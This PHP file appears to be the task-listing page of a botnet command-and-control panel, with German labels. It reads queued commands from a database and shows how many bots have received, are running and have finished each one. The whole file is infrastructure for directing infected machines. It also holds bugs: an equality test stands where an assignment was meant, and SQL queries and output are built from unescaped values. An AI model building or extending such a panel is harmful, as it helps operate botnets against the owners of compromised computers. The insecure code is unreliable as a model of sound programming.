<?php
	include('include/config.php');
	$query = panel_sql_request("SELECT * FROM ".$sql_table['tasks']." ORDER BY taskID DESC;");
	echo "<table width=100%>";
	echo '<td class="td">|<img src="img/id.png"> ID - STATUS</td>
	<td class="td">|<img src="img/befehl.png"> BEFEHL</td>
	<td class="td">|<img src="img/startzeit.png"> STARTZEIT</td>
	<td class="td">|<img src="img/endzeit.png"> ENDZEIT</td>
	<td class="td">|<img src="img/arbeit.png"> FERTIG / ARBEITEN / TOTAL</td>
	<td class="td">|<img src="img/delete.png"> TASK ENTFERNEN</td>
	</tr>';
	
	echo "<tr><td>-
	     </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td></tr>";
	
	while($row = $query->fetch_assoc()){
		if($row['startTime']<time()){
			$status = "[AKTIVER BEFEHL]";
			if($row['botsLeft']>0){
				$status = "[SENDE BEFEHL]";
			}
		}
		else{
			$status = "[IN BEARBEITUNG]";
		}
		if($row['endTime'] == "0"){
			$row['endTime'] == "[ENDED NIE]";
		}
		$botsworking = intval($row['botsUsed'])-intval($row['botsLeft']);
		$query2 = "	SELECT
										botID
									FROM ".$sql_table['done']."
									WHERE taskID = '".$row['taskID']."';";
							$result = $db->query($query2);
							$botsdone=0;
							while($result->fetch_assoc()){
								$botsdone++;
							}
		echo "<tr><td>|#".$row['taskID']." - ".$status." </td><td>|".$row['command']."</td><td>|".date("d.m.y - H:i",$row['startTime'])."</td><td>|";
		if($row['endTime'] == "0") echo "[PERMANENT]";
		else echo date("d.m.y - H:i",$row['endTime']);
		echo "</td><td>|(".$botsdone." / ".$botsworking ." / ".$row['botsUsed'].")</td><td><a href='javascript:deleteTask(".$row['taskID'].")'>[TASK ENTFERNEN]</a></td></tr>";
	}
	echo "</table>";
?>